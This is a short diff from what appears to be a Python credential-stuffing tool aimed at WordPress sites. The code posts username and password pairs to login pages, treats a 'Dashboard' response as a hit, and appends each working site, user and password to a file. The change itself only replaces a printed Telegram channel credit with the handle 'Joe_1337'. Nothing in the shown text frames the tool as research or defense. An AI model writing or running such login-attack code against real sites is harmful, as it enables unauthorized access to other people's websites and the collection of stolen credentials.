@@ -18,7 +18,7 @@ def attempt_login(wp_url_credentials):
         user, passwd = creds
         response = requests.post(site, headers=headers, data={'log': user, 'pwd': passwd, 'wp-submit': 'Log In'}, timeout=10)
         if 'Dashboard' in response.text:
-            print(Fore.GREEN + f"[Success] --> {site}"), print(Fore.MAGENTA + "Channel: https://t.me/thedrunkenbears")
+            print(Fore.GREEN + f"[Success] --> {site}"), print(Fore.MAGENTA + "Joe_1337")
             with open("wp-login-success.txt", "a") as file:
                 file.write(f"{site}#{user}@{passwd}\n")
         else:
